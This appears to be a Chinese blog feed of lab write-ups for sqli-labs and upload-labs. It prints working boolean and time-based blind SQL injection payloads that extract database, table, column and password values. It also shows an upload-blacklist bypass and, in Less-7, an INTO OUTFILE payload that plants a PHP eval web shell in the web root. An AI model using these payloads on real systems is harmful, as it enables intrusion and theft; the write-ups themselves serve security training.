</span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'上传出错！'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'此文件不允许上传'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'文件夹不存在,请手工创建！'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>提示和源码里的黑名单并不一致，提示里少了.htaccess<br><code>$file_ext = trim($file_ext); //首尾去空</code><br>+++</p></blockquote><ul><li>拦截方式：<strong>服务端黑名单</strong>;去掉了去除空格的trim函数；</li><li>绕过方式：选择后缀为<code>.php</code>的一句话上传，抓包后在后面增加空格;</li></ul><p><img src="https://s1.ax1x.com/2020/05/02/JvRylt.png" alt="JvRylt.png"></p><p>上传成功！</p><p>+++</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;upload-labs&quot;&gt;&lt;a href=&quot;#upload-labs&quot; class=&quot;headerlink&quot; title=&quot;upload-labs&quot;&gt;&lt;/a&gt;upload-labs&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://s1.ax1x.com/2020
      
    
    </summary>
    
    
      <category term="PHP" scheme="https://singlemindedt.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://singlemindedt.github.io/2020/04/09/sqli-labs-Page-1-Less-9/"/>
    <id>https://singlemindedt.github.io/2020/04/09/sqli-labs-Page-1-Less-9/</id>
    <published>2020-04-09T00:50:00.000Z</published>
    <updated>2020-04-09T11:44:35.092Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less-9（GET方式-盲注-基于时间-单引号）"><a href="#Less-9（GET方式-盲注-基于时间-单引号）" class="headerlink" title="Less-9（GET方式-盲注-基于时间-单引号）"></a>Less-9（GET方式-盲注-基于时间-单引号）</h2><p><img src="https://s1.ax1x.com/2020/04/09/Ghzoq0.png" alt="Ghzoq0.png"></p><p><strong>基于时间延迟注入：正确延迟，错误不延迟；</strong></p><p>具体操作与布尔型类似，这里需要用到sleep（）函数；</p><ol><li>爆库</li></ol><ul><li>库长</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(length(database())=8,sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4p8AK.png" alt="G4p8AK.png"></p><p>根据浏览器刷新的延迟程度，可以判断库长为8；</p><p>页面的回显并没有任何指示意思，即使是错误的判断也可返回<code>You are in.........</code>;</p><ul><li>库名</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(left(database(),1)='s',sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(left(database(),2)='se',sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><ol start="2"><li>爆表</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if( left((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>)=<span class="string">'e'</span> ,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--</span></span><br></pre></td></tr></table></figure><p>第一个表首字母为’e’;</p><ol start="3"><li>爆字段</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">8</span>)=<span class="string">'password'</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><ol start="4"><li>爆内容</li></ol><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and if(substr((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'d'</span>,<span class="keyword">sleep</span>(<span class="number">5</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>……</p><p>由于该方法与布尔报错型相似，只是用来表名正确的方式不同，因此不再赘述；</p><p>+++</p><h2 id="Less-10（GET方式-盲注-基于时间-双引号）"><a href="#Less-10（GET方式-盲注-基于时间-双引号）" class="headerlink" title="Less-10（GET方式-盲注-基于时间-双引号）"></a>Less-10（GET方式-盲注-基于时间-双引号）</h2><p>与第九关完全一致，仅把单引号改为了双引号闭合形式，只要更改一下参数后的符号即可；<br>例：库长</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1" and if(length(database())=8,sleep(5),1)<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4pfun.png" alt="G4pfun.png"></p><p>sleep()函数执行，页面延迟刷新，判断正确；<br>因为与Less-9基本一致，就不再赘述；</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Less-9（GET方式-盲注-基于时间-单引号）&quot;&gt;&lt;a href=&quot;#Less-9（GET方式-盲注-基于时间-单引号）&quot; class=&quot;headerlink&quot; title=&quot;Less-9（GET方式-盲注-基于时间-单引号）&quot;&gt;&lt;/a&gt;Less-9（GET方
      
    
    </summary>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://singlemindedt.github.io/2020/04/08/sqli-labs-Page-1-Less-8/"/>
    <id>https://singlemindedt.github.io/2020/04/08/sqli-labs-Page-1-Less-8/</id>
    <published>2020-04-08T07:41:44.000Z</published>
    <updated>2020-04-09T11:44:24.101Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less-8-GET方式-盲注-布尔型-单引号"><a href="#Less-8-GET方式-盲注-布尔型-单引号" class="headerlink" title="Less-8(GET方式-盲注-布尔型-单引号)"></a>Less-8(GET方式-盲注-布尔型-单引号)</h2><p><img src="https://s1.ax1x.com/2020/04/09/Gh6YrV.png" alt="Gh6YrV.png"></p><p>布尔型注入：正确有回显，错误无回显，逐字爆破；<br>利用二分法提高爆破效率;</p><p>该题完全可以利用之前第五关的任一方法，还可以用上一关的导入木马文件，既然题目有指示那就用布尔盲注好了。</p><ol><li>爆库名</li></ol><p><strong>猜测库名长度</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (length(database()))=8 <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/Gh6UVU.png" alt="Gh6UVU.png"></p><p>正常回显，说明库名长度为8；</p><ul><li>首字母<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and substr(database(),1,1)&lt;'t' --+</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://s1.ax1x.com/2020/04/09/Gh6tbT.png" alt="Gh6tbT.png"></p><p>正常回显，首字母ASCII码小于<code>t</code>;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and substr(database(),1,1)='s' <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/Gh6JK0.png" alt="Gh6JK0.png"></p><p>正常回显，说明库名首字母为<code>s</code>；</p><p>通过更改相应参数，可更改测试位：</p><ul><li>其它位<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and substr(database(),2,1)='e' <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="https://s1.ax1x.com/2020/04/09/Gh6d54.png" alt="Gh6d54.png"></p><p>……</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and substr(database(),1,8)='security' <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/Gh6aaF.png" alt="Gh6aaF.png"></p><p>说明库名为<code>security</code>;</p><p>+++</p><ol start="2"><li>爆表名<br>判断表长：<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">length</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>)=<span class="number">5</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="https://s1.ax1x.com/2020/04/09/G4pk7V.png" alt="G4pk7V.png"></p><p>说明，第4张表的长度位5；</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'u'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>得到第4张表首字母为’u’;<br>注：limit(0,1)从0开始表示首位/个；</p><p><img src="https://s1.ax1x.com/2020/04/09/Gh6D2R.png" alt="Gh6D2R.png"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>)=<span class="string">'s'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/Gh6BG9.png" alt="Gh6BG9.png"></p><p>正常回显，第2个字母为’s’;</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and mid((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">5</span>)=<span class="string">'users'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4S0FU.png" alt="G4S0FU.png"></p><p>通过更改mid(column_name,start[,length])中的’start’来改变位数，最终得到第4张表名为’users’;</p><p>+++</p><ol start="3"><li>爆字段</li></ol><p>判断列名长度：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">length</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>)=<span class="number">8</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>得到第5列，列名长度为8；</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and mid((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">4</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">8</span>)=<span class="string">'password'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4SBYF.png" alt="G4SBYF.png"></p><p>根据长度，猜测列名为<code>password</code>，验证得到正常返回；</p><p>+++</p><ol start="4"><li>爆内容</li></ol><ul><li>判断长度：</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and (<span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4pF00.png" alt="G4pF00.png"></p><p>得到’password’中第一条记录长度为4；</p><ul><li>逐一测试内容</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and substr((select password from users limit 0,1),1,1)=&apos;d&apos; --+</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4pBHP.png" alt="G4pBHP.png"></p><p>得到首字母为d；</p><p>……</p><p>得到该用户的密码为”dumb”(大小写不定);</p><p>同理，可通过如上方法得到对应用户名。从而得到用户名-密码；</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1' and mid((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=<span class="string">'i'</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/09/G4puc9.png" alt="G4puc9.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Less-8-GET方式-盲注-布尔型-单引号&quot;&gt;&lt;a href=&quot;#Less-8-GET方式-盲注-布尔型-单引号&quot; class=&quot;headerlink&quot; title=&quot;Less-8(GET方式-盲注-布尔型-单引号)&quot;&gt;&lt;/a&gt;Less-8(GET方式-盲注-
      
    
    </summary>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://singlemindedt.github.io/2020/04/06/sqli-labs-Page-1-Less-7/"/>
    <id>https://singlemindedt.github.io/2020/04/06/sqli-labs-Page-1-Less-7/</id>
    <published>2020-04-06T02:41:44.000Z</published>
    <updated>2020-04-08T03:27:50.578Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Less-7-GET方式-导出文件-string"><a href="#Less-7-GET方式-导出文件-string" class="headerlink" title="Less-7(GET方式-导出文件-string)"></a>Less-7(GET方式-导出文件-string)</h2><p><img src="https://s1.ax1x.com/2020/04/08/GRhL2d.png" alt="GRhL2d.png"></p><p>根据题目意思，应该是让我们利用<code>into outfile</code>将木马程序写入文件；</p><ol><li>首先，测试闭合id参数<br>方法还和之前几关一样，在id后加单引号、双引号、括号等字符看是否报错。若报错则id很可能是该种闭合方式，接下来再通过添加注释符来进一步测试是否为该种闭合方式；若语句正常执行，则说明id确为该种闭合方式。<br>经过测试发现：<br><code>格式为：id=((&#39;$id&#39;))</code></li></ol><p><img src="https://s1.ax1x.com/2020/04/08/GRhbPe.png" alt="GRhbPe.png"></p><p>+++</p><ol start="2"><li>关于<code>into outfile</code></li></ol><p>into outfile 主要用于将查询出来的结果导出到文本中;<br>但是，使用还需要如下权限：</p><ul><li>知道物理路径（into outfile ‘WEB目录的物理路径’）这样才能写对目录。（默认的当前目录是MySQL的数据目录）</li><li>能够使用union（也就是MySQL版本在3以上）</li><li>没有对’进行过滤（因为outfile后面的’’不可以用其他函数代替转换）</li><li>MySQL用户拥有file_priv权限（不然就不能写文件或者把文件内容读出）</li><li>对web目录有写权限。</li></ul><ol start="3"><li>先来看看物理路径：</li></ol><p><code>@@basedir:mysql安装路径</code></p><p><code>@@datadir:数据库路径</code></p><p>尝试获取路径：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">? id=-1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,@@datadir <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/08/GR4SVf.png" alt="GR4SVf.png"></p><p>没有将结果返回，应该是做了限制，语法正确时只返回<code>You are in.... Use outfile......</code></p><p>由于我是本地安装，知道这一系列题目均公用数据，这里可以借前几题查询路径；</p><p><img src="https://s1.ax1x.com/2020/04/08/GRh75D.png" alt="GRh75D.png"></p><p>尝试写入文件：</p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php @eval($_POST["pwd"]);?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"E:\\PhpStudy2018\\PHPTutorial\\WWW\\hack.php"</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>注：此处用<code>\\</code>否则,写入的文件名会非常长，为路径+文件名的组合形式；</p><p>发现响应位置并没有我们计划要写入的内容，即表示此时我们没有权限导入/导出；</p><p><strong>MySQL默认没有权限导入/导出文件，该权限与secure_file_priv有关,默认为NULL，即不允许导入导出；</strong></p><p><strong>secure-file-priv特性</strong><br>secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p><ul><li>ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</li><li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li><li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li></ul><p>查看secure-file-priv参数的值：                        </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">'%secure%'</span>;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2020/04/08/GRhoVK.png" alt="GRhoVK.png"></p><p>因为我们使用的是phpstudy,故在其目录下的MySQL下，在my.ini文件里加上secure_file_priv=‘’（<strong>英文</strong>单引号/双引号/什么都不加），此时表示不对mysqld 的导入|导出做限制,重启phpstudy即可；</p><p>尝试写入文件：</p><p>payload:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php @eval($_POST["pwd"]);?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"E:\\PhpStudy2018\\PHPTutorial\WWW\\hack.php"</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>可以发现在相应的目录下已经出现了我们计划写入的文件；</p><p>注：当文件名重复时，指令不会再次执行，即不会覆盖原来重名文件；</p><p><img src="https://s1.ax1x.com/2020/04/08/GRhTUO.png" alt="GRhTUO.png"></p><p>查看写入文件内容：</p><p><img src="https://s1.ax1x.com/2020/04/08/GRhOxA.png" alt="GRhOxA.png"></p><p>+++</p><p>接下来就可以使用菜刀连接了；</p><p>由payload可知我们把文件写在了站点根目录里了，所以连接菜刀只需写如下内容：</p><p><code>http://</code>127.0.0.1/hack.php</p><p><img src="https://s1.ax1x.com/2020/04/08/GRhvrt.png" alt="GRhvrt.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Less-7-GET方式-导出文件-string&quot;&gt;&lt;a href=&quot;#Less-7-GET方式-导出文件-string&quot; class=&quot;headerlink&quot; title=&quot;Less-7(GET方式-导出文件-string)&quot;&gt;&lt;/a&gt;Less-7(GET方式-
      
    
    </summary>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://singlemindedt.github.io/2020/03/29/sqli-labs-Page-1-Less-6/"/>
    <id>https://singlemindedt.github.io/2020/03/29/sqli-labs-Page-1-Less-6/</id>
    <published>2020-03-29T02:53:22.000Z</published>
    <updated>2020-03-29T11:29:31.113Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Less-6-GET方式-双注入-双引号-string型"><a href="#Less-6-GET方式-双注入-双引号-string型" class="headerlink" title="Less-6(GET方式-双注入-双引号-string型)"></a>Less-6(GET方式-双注入-双引号-string型)</h1><p>此题在上一题的基础上只是更改了闭合类型（由单引号改为双引号），其他不变，可以用Less-5的方法解决；</p><p>举例：判断库名长度；</p><p><img src="https://s1.ax1x.com/2020/03/29/GZi4Nd.png" alt="GZi4Nd.png"></p><p>正确回显，说明判断正确，库名长度确实为8；</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Less-6-GET方式-双注入-双引号-string型&quot;&gt;&lt;a href=&quot;#Less-6-GET方式-双注入-双引号-string型&quot; class=&quot;headerlink&quot; title=&quot;Less-6(GET方式-双注入-双引号-string型)&quot;&gt;&lt;/a&gt;L
      
    
    </summary>
    
    
      <category term="SQL" scheme="https://singlemindedt.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://singlemindedt.github.io/2020/03/15/sqli-labs-Page-1-Less-5/"/>
    <id>https://singlemindedt.github.io/2020/03/15/sqli-labs-Page-1-Less-5/</id>
    <published>2020-03-15T10:41:44.000Z</published>
    <updated>2020-05-15T00:13:22.358Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="Less-5-GET方式-双注入-单引号-string型"><a href="#Less-5-GET方式-双注入-单引号-string型" class="headerlink" title="Less-5(GET方式-双注入-单引号-string型)"></a>Less-5(GET方式-双注入-单引号-string型)</h2><p>此题和之前不太一样，当你输入信息是并不返回结果，只返回<code>You are in..........</code>或是语法错误；<br>如下：<br>[50]:()</p><p><img src="https://s1.ax1x.com/2020/03/15/838PKO.png" alt="838PKO.png"><br>+++<br>[51]:()<br><img src="https://s1.ax1x.com/2020/03/15/838p26.png" alt="838p26.png"><br>说明没有显示位，无法使用联合查询；</p><h3 id="方法1：布尔盲注-boolean-based-blind"><a href="#方法1：布尔盲注-boolean-based-blind" class="headerlink" title="方法1：布尔盲注(boolean-based blind)"></a>方法1：布尔盲注(boolean-based blind)</h3><p>布尔型注入：正确有回显，错误无回显，逐字爆破；<br>利用二分法提高爆破效率;</p><ol><li>爆库名</li></ol><p><strong>猜测库名长度：</strong><br><code>?id=1&#39; and (length(database()))&gt;9 --+</code><br>[60]:()</p><p><img src="https://s1.ax1x.com/2020/03/16/88Tx1J.png" alt="88Tx1J.png"></p><p>无回显，说明错误；<br><code>?id=1&#39; and (length(database()))=8 --+</code></p><p><img src="https://s1.ax1x.com/2020/03/16/887ktO.png" alt="887ktO.png"></p><p>正常回显，说明库长为8；</p><ul><li><p>首字母</p><p><strong>left()函数：</strong></p></li></ul><ul><li><table><thead><tr><th>格式</th><th>说明</th></tr></thead><tbody><tr><td>left(string,n)</td><td>string为要截取的字符串；n为长度</td></tr><tr><td>left(database(),1)&gt;’s’</td><td>查看字符串首字母是否大于‘s’</td></tr><tr><td>left(database(),2)&gt;’se’</td><td>查看字符串前两位字母是否大于’se’</td></tr><tr><td>string可自行构造语句注入；</td><td></td></tr></tbody></table><p><code>?id=1&#39; and left((select database()),1)&lt;&#39;t&#39;--+</code></p></li></ul><p><img src="https://s1.ax1x.com/2020/03/16/887C0x.png" alt="887C0x.png"></p><p>得到正常回显，即首字母是比t小的字母；</p><p><code>?id=1&#39; and left((select database()),1)=&#39;s&#39;--+</code></p><p><img src="https://s1.ax1x.com/2020/03/16/887SXR.png" alt="887SXR.png"></p><p>正常回显，说明首字母为’s’;</p><p><code>?id=1&#39; and left((select database()),1)&lt;&#39;s&#39;--+</code></p><p><img src="https://s1.ax1x.com/2020/03/16/88Tzc9.png" alt="88Tzc9.png"></p><p>无回显，说明我们的推测结果是对的；</p><ul><li>其他位<br><code>?id=1&#39; and left((select database()),2)&gt;&#39;sd&#39;--+</code></li></ul><p><img src="https://s1.ax1x.com/2020/03/16/887AhD.png" alt="887AhD.png"></p><p>正常回显，说明第二个字母应大于’d’；<br><code>?id=1&#39; and left((select database()),2)=&#39;se&#39;--+</code><br>[63]:()</p><p><img src="https://s1.ax1x.com/2020/03/16/887V9e.png" alt="887V9e.png"></p><p>正常回显，说明前两位为’se’;<br>爆其它位与上述方法相同，此处省略，最终得到库名为”security”;<br><strong>substr()函数：</strong>（与substring（）相似）</p><table><thead><tr><th>格式</th><th>说明</th></tr></thead><tbody><tr><td>substr(string,start,length)</td><td>string要处理的字符串；start开始位置；length截取长度</td></tr><tr><td>substr(database(),1,1)&gt;’s’</td><td>查看数据库名首位；</td></tr><tr><td>substr(database(),2,1)&gt;’s’</td><td>查看数据库名第2位；</td></tr><tr><td>string可自行构造语句注入；</td><td></td></tr></tbody></table><ul><li>首字母</li></ul><p><code>?id=1&#39; and substr(database(),1,1)&lt;&#39;t&#39; --+</code><br>[64]:()</p><p><img src="https://s1.ax1x.com/2020/03/16/88Tvp4.png" alt="88Tvp4.png"></p><p>正常回显；<br><code>?id=1&#39; and substr(database(),1,1)=&#39;s&#39; --+</code><br>[65]:()</p><p><img src="https://s1.ax1x.com/2020/03/16/887P76.png" alt="887P76.png"></p><ul><li>其它位<br><code>?id=1&#39; and substr(database(),2,1)&lt;&#39;f&#39; --+</code></li></ul><p><img src="https://s1.ax1x.com/2020/03/16/887FAK.png" alt="887FAK.png"></p><p>正常回显；<br><code>?id=1&#39; and substr(database(),2,1)&lt;&#39;e&#39; --+</code><br>[67]:()</p><p><img src="https://s1.ax1x.com/2020/03/22/85bWHP.png" alt="85bWHP.png"></p><p>无回显，说明此处位’e’;<br><strong>mid()函数</strong></p><table><thead><tr><th>格式</th><th>说明</th></tr></thead><tbody><tr><td>MID(column_name,start[,length])</td><td>column_name要提取字符的字段;start规定开始位置（起始位置为1）；要返回的字符数。如果省略，则MID()函数返回剩余文本；</td></tr><tr><td>mid(database(),1,1)&gt;’s’</td><td>查看数据库名首位是否大于’s’；</td></tr><tr><td>mid(database(),2,1)&gt;’e’</td><td>查看数据库名的第2位是否大于’e’；</td></tr><tr><td>column_name可自行构造语句注入；</td><td></td></tr></tbody></table><ul><li>首字母</li></ul><p><code>?id=1&#39; and mid(database(),1,1)&gt;&#39;r&#39; --+</code><br>[68]:()</p><p><img src="https://s1.ax1x.com/2020/03/22/85bRBt.png" alt="85bRBt.png"></p><p>正常回显，首字母大于’r’;<br><code>?id=1&#39; and mid(database(),1,1)&lt;&#39;t&#39; --+</code><br>[69]:()</p><p><img src="https://s1.ax1x.com/2020/03/22/85bo9g.png" alt="85bo9g.png"></p><p>正常回显，说明首字母为’s’;</p><ul><li>其它位<br><code>?id=1&#39; and mid(database(),2,1)&lt;&#39;f&#39; --+</code></li></ul><p><img src="https://s1.ax1x.com/2020/03/22/85b54S.png" alt="85b54S.png"></p><p>正常回显，判断正确；<br><code>?id=1&#39; and mid(database(),2,1)=&#39;e&#39; --+</code><br>[71]:()</p><p><img src="https://s1.ax1x.com/2020/03/22/85bhAf.png" alt="85bhAf.png"></p><p>正常回显，此处为’e’;<br>其他位操作相同；<br><strong>ORD()函数</strong><br>此函数为返回第一个字符的ASCII码，经常与上面的函数进行组合使用。<br>eg:<br>ORD(mid(database(),1,1))&gt;115 意为检测database()的首位ASCII码是否大于115，即‘s’;<br>[72]:()</p><p><img src="https://s1.ax1x.com/2020/03/22/85b4N8.png" alt="85b4N8.png"></p><p>无回显，首字母ASCll不大于115；<br>[73]:()</p><p><img src="https://s1.ax1x.com/2020/03/22/85b7cj.png" alt="85b7cj.png"></p><p>正常回显。首字母为’s’;</p><ol start="2"><li>爆表名</li></ol><p><code>?id=1&#39; and mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),1,1)=&#39;u&#39; --+</code><br>[74]:()</p><p><img src="https://s1.ax1x.com/2020/03/22/85bHjs.png" alt="85bHjs.png"></p><p>得到第4张表首字母为’u’;<br><code>?id=1&#39; and mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),2,1)=&#39;s&#39; --+</code></p><p><img src="https://s1.ax1x.com/2020/03/22/85bLBq.png" 